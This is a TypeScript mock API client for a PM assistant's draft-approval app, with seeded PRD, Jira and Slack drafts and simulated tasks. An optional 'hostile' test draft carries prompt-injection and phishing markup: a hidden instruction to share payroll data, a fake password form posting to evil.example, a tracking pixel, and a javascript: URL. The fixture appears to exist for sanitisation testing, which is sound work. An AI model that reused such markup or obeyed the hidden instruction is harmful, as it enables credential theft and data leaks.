import { ApiError, REJECT_REASONS } from './types';
import type {
  Api,
  Brief,
  Draft,
  DraftSummary,
  FollowUp,
  HintName,
  Me,
  RejectReason,
  Suggestion,
  Task,
  TaskEvent,
} from './types';

export interface MockOptions {
  /** Pretend network delay in ms. Tests use 0. */
  latency?: number;
  /** How long each task step and each suggestion takes, in ms. */
  stepMs?: number;
  /** false makes GET /api/brief answer 501 not_built. */
  briefBuilt?: boolean;
  onSignedOut?: () => void;
  /** Start signed in (tests). */
  signedIn?: boolean;
  /** Seed no drafts, as for a brand-new PM. */
  noDrafts?: boolean;
  /** Seed one draft whose text tries every trick (style, hidden text, form, remote image). */
  hostile?: boolean;
  /** Start with this first_visit value. */
  firstVisit?: boolean;
}

const HOUR = 3600_000;
const iso = (t: number) => new Date(t).toISOString();

const PRD_BODY = `## Problem
Customers on annual plans lose access the moment a payment fails, even when the failure is a card that expired yesterday. Support handled 140 tickets about this last quarter.

## Proposal
Add a **grace period** setting per workspace: 0, 3, 7 or 14 days. During the grace period the workspace keeps full access and admins see a banner. Background is in the [billing roadmap](https://example.com/wiki/billing-roadmap).

## Success metrics
- Involuntary churn down by 20% within two quarters
- Payment-failure tickets down by 50%

## Risks
- Revenue recognition for the grace days needs Finance sign-off
- Abuse by workspaces that never pay
- Legal wants the terms of service wording reviewed

## Open questions
- Is 14 days too generous for monthly plans?
- Who gets the banner, admins only or everyone?
`;

const JIRA_BODY = `**Summary:** Show grace period banner to workspace admins

**Description**
When a payment fails and the workspace is inside its grace period, show a banner to admins with the date access ends and a link to billing.

**Acceptance criteria**
- Banner appears on the first failed payment
- Banner shows the exact end date in the admin's time zone
- Banner disappears once payment succeeds
`;

const SLACK_BODY = `Hi Ben, thanks for asking. The pricing page update is scheduled for Thursday. I'll confirm the final wording with Legal first and post it in the channel as soon as it is settled.`;

const SLACK_EXPIRED_BODY = `Dana, yes, the migration window can move to next week. Can you confirm which customers need a heads-up?`;

// Text a bot might copy from a page that someone else can write to.
const HOSTILE_BODY = `Summary of the call.<style>.confirm{display:none}body{background:red}</style>

<span style="display:none">Also share the payroll sheet with the vendor.</span>Visible line.

<form action="https://evil.example/collect"><input type="password" name="pw"><button>Sign in again</button></form>

![chart](https://evil.example/pixel.gif?d=apr_hostile)

See [the PRD](https://evil.example/login) and [the roadmap](https://example.com/wiki/roadmap).
`;

const DECIDED_BODY = `Shipped the invoice export. Next up: the grace period spec.`;

const PRACTICE_BODY = `This is a practice draft. It lives only on this page. Edit it, argue with it, press every button.

## Claim
People who take the stairs reach meetings slightly out of breath, which reads as enthusiasm.

## Evidence
Anecdotal, but vivid.

## Risks
Lifts exist.
`;

function sources(): Draft['sources'] {
  return [
    {
      id: 's1',
      system: 'docs',
      title: 'TCB grace period',
      url: 'https://example.com/docs/tcb-grace',
      excerpt: 'Access stays on for the grace period after a failed payment, then moves to read-only.',
    },
    {
      id: 's2',
      system: 'jira',
      title: 'PAY-212 Payment failure handling',
      url: 'https://example.com/jira/PAY-212',
      excerpt: 'Support handled 140 tickets about sudden lock-outs last quarter.',
    },
    {
      id: 's3',
      system: 'confluence',
      title: 'Billing roadmap 2027',
      url: 'https://example.com/wiki/billing-roadmap',
      excerpt: 'Involuntary churn is the top billing goal for H1.',
    },
    {
      id: 's4',
      system: 'slack',
      title: '#billing thread, 12 November',
      url: 'https://example.com/slack/billing/p1',
      excerpt: 'Legal wants to review the terms of service wording before anything ships.',
    },
    {
      id: 's5',
      system: 'drive',
      title: 'Churn analysis Q3.xlsx',
      url: 'https://example.com/drive/churn-q3',
      excerpt: null,
    },
  ];
}

interface MockTask {
  task: Task;
  startedAt: number;
  plan: { at: number; text: string; kind?: string }[];
  outcome: 'done' | 'failed' | 'draft';
  draftId: string | null;
  settledAfter: number;
}

export function createMockClient(options: MockOptions = {}): Api {
  const latency = options.latency ?? 250;
  const stepMs = options.stepMs ?? 1200;
  const briefBuilt = options.briefBuilt ?? true;
  const now0 = Date.now();
  let seq = 100;
  const nextId = (p: string) => `${p}_${++seq}`;

  let signedIn = options.signedIn ?? false;
  const me: Me = {
    handle: 'ana',
    name: 'Ana Silva',
    roles: ['pm'],
    csrf_token: 'mock-csrf-token',
    first_visit: options.firstVisit ?? !!options.noDrafts,
    hints_seen: [],
    nudges: true,
  };

  const drafts = new Map<string, Draft>();
  const add = (d: Draft) => {
    d.version ??= '1';
    drafts.set(d.id, d);
  };
  const bump = (d: Draft) => {
    d.version = String(Number(d.version ?? '1') + 1);
  };

  if (!options.noDrafts) {
    add({
      id: 'apr_prd',
      kind: 'confluence_page',
      title: 'PRD: TCB grace period setting',
      bot: 'pm-ana',
      status: 'pending',
      created_at: iso(now0 - 2 * HOUR),
      expires_at: null,
      task_id: null,
      practice: false,
      body: PRD_BODY,
      edited: false,
      target: { system: 'confluence', label: 'Space PM, under Specs', url: null },
      sources: sources(),
      result_url: null,
      external: false,
    });
    add({
      id: 'apr_jira',
      kind: 'jira_issue',
      title: 'Show grace period banner to workspace admins',
      bot: 'pm-ana',
      status: 'pending',
      created_at: iso(now0 - 3 * HOUR),
      expires_at: null,
      task_id: null,
      practice: false,
      body: JIRA_BODY,
      edited: false,
      target: { system: 'jira', label: 'Project PAY, as a Story', url: null },
      sources: sources().slice(0, 2),
      result_url: null,
      external: false,
    });
    add({
      id: 'apr_slack',
      kind: 'slack_reply',
      title: 'Reply to Ben in #partner-pricing',
      bot: 'pm-ana',
      status: 'pending',
      created_at: iso(now0 - 1 * HOUR),
      expires_at: iso(now0 + 23 * HOUR),
      task_id: null,
      practice: false,
      body: SLACK_BODY,
      edited: false,
      target: { system: 'slack', label: '#partner-pricing, a channel shared with Acme Corp', url: null },
      sources: [],
      result_url: null,
      external: true,
    });
    add({
      id: 'apr_slack_old',
      kind: 'slack_reply',
      title: 'Reply to Dana in #migrations',
      bot: 'pm-ana',
      status: 'pending',
      created_at: iso(now0 - 30 * HOUR),
      expires_at: iso(now0 - 6 * HOUR),
      task_id: null,
      practice: false,
      body: SLACK_EXPIRED_BODY,
      edited: false,
      target: { system: 'slack', label: '#migrations', url: null },
      sources: [],
      result_url: null,
      external: false,
    });
    add({
      id: 'apr_done',
      kind: 'confluence_page',
      title: 'Weekly update, 9 November',
      bot: 'pm-ana',
      status: 'approved',
      created_at: iso(now0 - 7 * 24 * HOUR),
      expires_at: null,
      task_id: null,
      practice: false,
      body: DECIDED_BODY,
      edited: true,
      target: { system: 'confluence', label: 'Space PM, under Updates', url: null },
      sources: [],
      result_url: 'https://example.com/wiki/weekly-9-nov',
      external: false,
    });
  }

  if (options.hostile) {
    add({
      id: 'apr_hostile',
      kind: 'confluence_page',
      title: 'Vendor call notes',
      bot: 'pm-ana',
      status: 'pending',
      created_at: iso(now0 - 4 * HOUR),
      expires_at: null,
      task_id: null,
      practice: false,
      body: HOSTILE_BODY,
      edited: false,
      target: { system: 'confluence', label: 'Space PM, under Notes', url: null },
      sources: [{ id: 'h1', system: 'docs', title: 'Odd link source', url: 'javascript:alert(1)', excerpt: null }],
      result_url: null,
      external: false,
    });
  }

  const suggestions = new Map<string, { s: Suggestion; at: number; ready: string }>();
  const tasks = new Map<string, MockTask>();
  const failedOnce = new Set<string>();

  // Earlier requests, so Activity and the home page have a history to show.
  if (!options.noDrafts) {
    const seed = (id: string, text: string, ago: number, rest: Partial<Task>) => {
      const at = now0 - ago;
      const ev = (kind: string, t: string, dt: number): TaskEvent => ({ at: iso(at + dt), kind, text: t });
      const task: Task = {
        id,
        bot: 'pm-ana',
        text,
        status: 'done',
        result: null,
        error: null,
        draft_ids: [],
        created_at: iso(at),
        updated_at: iso(at + 40_000),
        events: [
          ev('queued', 'Queued', 0),
          ev('claimed', 'Claimed by pm-ana', 1000),
          ev('milestone', 'Reading Jira', 2000),
          ev('progress', '1 of 2 done', 9000),
          ev('milestone', 'Reading Confluence', 10_000),
          ev('milestone', 'Putting the answer together', 30_000),
        ],
        ...rest,
      };
      tasks.set(id, { task, startedAt: at, plan: [], outcome: 'done', draftId: null, settledAfter: 0 });
    };
    seed('tsk_seed_failed', 'Summarize the DPA thread with Legal', 3 * 24 * HOUR, {
      status: 'failed',
      error: 'I could not reach Slack just now, so I stopped before guessing. Try again in a moment.',
    });
    seed('tsk_seed_week', 'What changed in billing this week?', 26 * HOUR, {
      result:
        '## Billing this week\n\n- **PAY-212** moved to *Blocked*, waiting on Finance sign-off\n- The grace period spec got two new comments from Legal\n- Support tickets about lock-outs are down 12% on last week\n\nNothing needs you right now, but Finance is the one to watch.',
    });
    seed('tsk_seed_prd', 'Draft a PRD for the TCB grace period setting', 2 * HOUR + 5 * 60_000, {
      status: 'needs_approval',
      draft_ids: ['apr_prd'],
      result: 'The draft is ready, with the sources I read alongside it.',
    });
    const prd = drafts.get('apr_prd');
    if (prd) prd.task_id = 'tsk_seed_prd';
  }

  const followUps = {
    waiting_on_you: [
      { id: 'fu_1', system: 'slack', who: 'Ben', summary: 'asked about the pricing page', url: 'https://example.com/slack/ben', age_days: 2 },
      { id: 'fu_2', system: 'jira', who: 'Priya', summary: 'asked for a decision on PAY-230', url: 'https://example.com/jira/PAY-230', age_days: 4 },
    ] as FollowUp[],
    you_wait_on: [
      { id: 'fu_3', system: 'slack', who: 'Legal', summary: 'the DPA question', url: 'https://example.com/slack/legal', age_days: 3 },
    ] as FollowUp[],
  };

  const wait = async () => {
    if (latency > 0) await new Promise((r) => setTimeout(r, latency));
  };
  const guard = () => {
    if (!signedIn) {
      options.onSignedOut?.();
      throw new ApiError(401, 'signed_out', 'You are signed out.');
    }
  };
  const find = (id: string): Draft => {
    const d = drafts.get(id);
    if (!d) throw new ApiError(404, 'not_found', 'I could not find that draft.');
    return d;
  };
  const clone = <T,>(v: T): T => structuredClone(v);
  const summary = (d: Draft): DraftSummary => {
    const {
      id, kind, title, bot, status, created_at, expires_at, task_id, practice,
    } = d;
    return { id, kind, title, bot, status, created_at, expires_at, task_id, practice };
  };
  const pendingOnly = (d: Draft) => {
    if (d.status !== 'pending') throw new ApiError(409, 'not_pending', 'This draft has already been decided.');
  };

  function makeDraftFromTask(text: string, taskId: string): Draft {
    const slack = /reply|nudge/i.test(text);
    const id = nextId('apr');
    const d: Draft = slack
      ? {
          id,
          kind: 'slack_reply',
          title: /nudge/i.test(text) ? 'Nudge to Legal about the DPA' : 'Reply to Ben about the pricing page',
          bot: 'pm-ana',
          status: 'pending',
          created_at: iso(Date.now()),
          expires_at: iso(Date.now() + 24 * HOUR),
          task_id: taskId,
          practice: false,
          body: /nudge/i.test(text)
            ? 'Hi Legal, a gentle nudge on the DPA question from Thursday. Even a rough ETA would help me plan the launch.'
            : SLACK_BODY,
          edited: false,
          target: { system: 'slack', label: '#billing', url: null },
          sources: [],
          result_url: null,
          external: false,
        }
      : {
          id,
          kind: 'confluence_page',
          title: 'PRD: ' + (text.replace(/^(draft|write)( a| the)?( prd)?( for| about)?/i, '').trim() || 'new feature'),
          bot: 'pm-ana',
          status: 'pending',
          created_at: iso(Date.now()),
          expires_at: null,
          task_id: taskId,
          practice: false,
          body: PRD_BODY,
          edited: false,
          target: { system: 'confluence', label: 'Space PM, under Specs', url: null },
          sources: sources(),
          result_url: null,
          external: false,
        };
    add(d);
    return d;
  }

  function startTask(text: string): Task {
    const id = nextId('tsk');
    const t0 = Date.now();
    const wantsDraft = /draft|prd|write|reply|nudge/i.test(text);
    const failing = /fail|break/i.test(text) && !failedOnce.has(text);
    if (failing) failedOnce.add(text);
    // The runtime also sends bookkeeping events (queued, claimed, started, counts). The app must
    // show only the milestones, so the sample data sends both.
    const plan = [
      { at: 0, text: 'Queued', kind: 'queued' },
      { at: 0, text: 'Claimed by pm-ana', kind: 'claimed' },
      { at: 0, text: 'Started', kind: 'started' },
      { at: 0, text: 'Reading Jira' },
      { at: 0.5, text: '1 of 3 done', kind: 'progress' },
      { at: 1, text: 'Reading Confluence' },
      ...(/busy/i.test(text) ? [{ at: 1.5, text: 'The model is busy, retrying', kind: 'retry' }] : []),
      { at: 1.2, text: '2 of 3 done', kind: 'progress' },
      { at: 2, text: wantsDraft ? 'Writing the draft' : 'Putting the answer together' },
    ];
    const task: Task = {
      id,
      bot: 'pm-ana',
      text,
      status: 'queued',
      result: null,
      error: null,
      draft_ids: [],
      created_at: iso(t0),
      updated_at: iso(t0),
      events: [],
    };
    tasks.set(id, {
      task,
      startedAt: t0,
      plan: plan.map((p) => ({ ...p, at: p.at * stepMs })),
      outcome: failing ? 'failed' : wantsDraft ? 'draft' : 'done',
      draftId: null,
      settledAfter: 3 * stepMs,
    });
    return clone(task);
  }

  function advance(m: MockTask): Task {
    const elapsed = Date.now() - m.startedAt;
    const t = m.task;
    if (t.status === 'done' || t.status === 'failed' || t.status === 'needs_approval') return t;
    const events: TaskEvent[] = [];
    for (const p of m.plan) {
      if (elapsed >= p.at) {
        events.push({ at: iso(m.startedAt + p.at), kind: p.kind ?? 'milestone', text: p.text });
      }
    }
    t.events = events;
    t.status = elapsed > 0 || stepMs === 0 ? 'working' : 'queued';
    if (elapsed >= m.settledAfter) {
      t.updated_at = iso(Date.now());
      if (m.outcome === 'failed') {
        t.status = 'failed';
        t.error = 'I could not reach Jira just now, so I stopped before guessing. Try again in a moment.';
      } else if (m.outcome === 'draft') {
        const d = makeDraftFromTask(t.text, t.id);
        t.status = 'needs_approval';
        t.draft_ids = [d.id];
        t.result = 'The draft is ready, with the sources I read alongside it.';
      } else {
        t.status = 'done';
        t.result = `Here is what I found.\n\n- **PAY-212** moved to Blocked yesterday\n- Two new comments on the *grace period* spec\n- Nothing new in #billing\n\nYou asked: "${t.text}"`;
      }
    }
    return t;
  }

  return {
    async devLogin(handle) {
      await wait();
      if (!handle.trim()) throw new ApiError(403, 'not_a_member', 'That handle is not on the team.');
      if (handle.trim().toLowerCase() === 'nobody') {
        throw new ApiError(403, 'not_a_member', 'That handle is not on the team list, so I can not sign you in.');
      }
      signedIn = true;
      me.handle = handle.trim().toLowerCase();
    },
    async logout() {
      await wait();
      signedIn = false;
    },
    async me() {
      await wait();
      guard();
      return clone(me);
    },
    async setNudges(nudges) {
      await wait();
      guard();
      me.nudges = nudges;
      return clone(me);
    },
    async markHintSeen(seen: HintName) {
      await wait();
      guard();
      if (!me.hints_seen.includes(seen)) me.hints_seen.push(seen);
      return clone(me);
    },
    async resetHints() {
      await wait();
      guard();
      me.hints_seen = [];
      return clone(me);
    },

    async listDrafts() {
      await wait();
      guard();
      const all = [...drafts.values()].sort((a, b) => b.created_at.localeCompare(a.created_at));
      const pending = all.filter((d) => d.status === 'pending');
      const decided = all.filter((d) => d.status !== 'pending').slice(0, 20);
      return [...pending, ...decided].map(summary);
    },
    async getDraft(id) {
      await wait();
      guard();
      const d = find(id);
      me.first_visit = false;
      return clone(d);
    },
    async saveDraft(id, input) {
      await wait();
      guard();
      const d = find(id);
      pendingOnly(d);
      d.body = input.body;
      if (input.title !== undefined) d.title = input.title;
      d.edited = true;
      bump(d);
      return clone(d);
    },
    async requestChange(id, instruction) {
      await wait();
      guard();
      const d = find(id);
      pendingOnly(d);
      if (suggestions.get(id)?.s.status === 'working') {
        throw new ApiError(409, 'change_in_progress', 'I am still working on your last change.');
      }
      const lines = d.body.split('\n');
      let next: string;
      if (/short|trim|cut/i.test(instruction)) {
        // drop the last paragraph block
        const blocks = d.body.trimEnd().split(/\n\n/);
        next = (blocks.length > 1 ? blocks.slice(0, -1) : blocks).join('\n\n') + '\n';
      } else {
        next = [...lines.filter((l, i) => !(i === lines.length - 1 && l === '')), '', `_Revised: ${instruction}_`, ''].join('\n');
      }
      const failing = /fail/i.test(instruction);
      const s: Suggestion = { status: 'working', instruction, body: null, error: null };
      suggestions.set(id, { s, at: Date.now(), ready: next });
      if (failing) suggestions.get(id)!.ready = '\u0000fail';
      return clone(s);
    },
    async getSuggestion(id) {
      await wait();
      guard();
      find(id);
      const entry = suggestions.get(id);
      if (!entry) return null;
      if (entry.s.status === 'working' && Date.now() - entry.at >= stepMs) {
        if (entry.ready === '\u0000fail') {
          entry.s = { ...entry.s, status: 'failed', error: 'I could not make that change. Try saying it another way.' };
        } else {
          entry.s = { ...entry.s, status: 'ready', body: entry.ready };
        }
      }
      return clone(entry.s);
    },
    async acceptSuggestion(id) {
      await wait();
      guard();
      const d = find(id);
      pendingOnly(d);
      const entry = suggestions.get(id);
      if (!entry || entry.s.status !== 'ready' || entry.s.body === null) {
        throw new ApiError(404, 'not_found', 'There is no suggestion to accept.');
      }
      d.body = entry.s.body;
      d.edited = true;
      bump(d);
      suggestions.delete(id);
      return clone(d);
    },
    async rejectSuggestion(id) {
      await wait();
      guard();
      const d = find(id);
      suggestions.delete(id);
      return clone(d);
    },
    async approve(id, o) {
      await wait();
      guard();
      const d = find(id);
      pendingOnly(d);
      if (d.expires_at && Date.parse(d.expires_at) < Date.now()) {
        d.status = 'expired';
        throw new ApiError(409, 'expired', 'This Slack draft expired after 24 hours, so it was not sent.');
      }
      if (o?.version !== undefined && o.version !== d.version) {
        throw new ApiError(409, 'stale', 'This draft changed after you opened it.');
      }
      if (d.external && !o?.confirmExternal) {
        throw new ApiError(409, 'needs_external_confirm', 'This channel is shared outside the company. Confirm to send it there.');
      }
      d.status = 'approved';
      d.result_url = d.practice ? null : `https://example.com/${d.target.system}/${d.id}`;
      return clone(d);
    },
    async reject(id, reason?: RejectReason) {
      await wait();
      guard();
      const d = find(id);
      pendingOnly(d);
      if (reason && !REJECT_REASONS.includes(reason)) {
        throw new ApiError(400, 'bad_reason', 'That is not a reason I know.');
      }
      d.status = 'rejected';
      return clone(d);
    },
    async createPractice() {
      await wait();
      guard();
      const existing = [...drafts.values()].find((d) => d.practice && d.status === 'pending');
      if (existing) return clone(existing);
      const d: Draft = {
        id: nextId('prc'),
        kind: 'confluence_page',
        title: 'Practice: why PMs should take the stairs',
        bot: 'pm-ana',
        status: 'pending',
        created_at: iso(Date.now()),
        expires_at: null,
        task_id: null,
        practice: true,
        body: PRACTICE_BODY,
        edited: false,
        target: { system: 'confluence', label: 'Nowhere. This is a practice draft.', url: null },
        sources: sources().slice(0, 3),
        result_url: null,
        external: false,
      };
      add(d);
      return clone(d);
    },
    async deleteDraft(id) {
      await wait();
      guard();
      const d = find(id);
      if (!d.practice) throw new ApiError(409, 'not_practice', 'Only practice drafts can be deleted.');
      drafts.delete(id);
    },

    async createTask(text) {
      await wait();
      guard();
      return startTask(text);
    },
    async getTask(id) {
      await wait();
      guard();
      const m = tasks.get(id);
      if (!m) throw new ApiError(404, 'not_found', 'I could not find that task.');
      return clone(advance(m));
    },
    async listTasks() {
      await wait();
      guard();
      return [...tasks.values()].map((m) => {
        const t = clone(advance(m));
        delete t.events;
        return t;
      });
    },

    async brief(): Promise<Brief> {
      await wait();
      guard();
      if (!briefBuilt) throw new ApiError(501, 'not_built', 'The daily brief is not built yet.');
      return {
        date: iso(Date.now()).slice(0, 10),
        changed: [
          { system: 'jira', title: 'PAY-212 moved to Blocked', summary: 'Waiting on Finance sign-off.', url: 'https://example.com/jira/PAY-212' },
        ],
        waiting_on_you: clone(followUps.waiting_on_you),
        you_wait_on: clone(followUps.you_wait_on),
      };
    },
    async dismissFollowup(id) {
      await wait();
      guard();
      followUps.waiting_on_you = followUps.waiting_on_you.filter((f) => f.id !== id);
      followUps.you_wait_on = followUps.you_wait_on.filter((f) => f.id !== id);
    },
    async draftFollowup(id) {
      await wait();
      guard();
      const all = [...followUps.waiting_on_you, ...followUps.you_wait_on];
      const f = all.find((x) => x.id === id);
      if (!f) throw new ApiError(404, 'not_found', 'I could not find that follow-up.');
      const mine = followUps.waiting_on_you.some((x) => x.id === id);
      return startTask(mine ? `Draft a reply to ${f.who}` : `Draft a nudge to ${f.who}`);
    },
  };
}
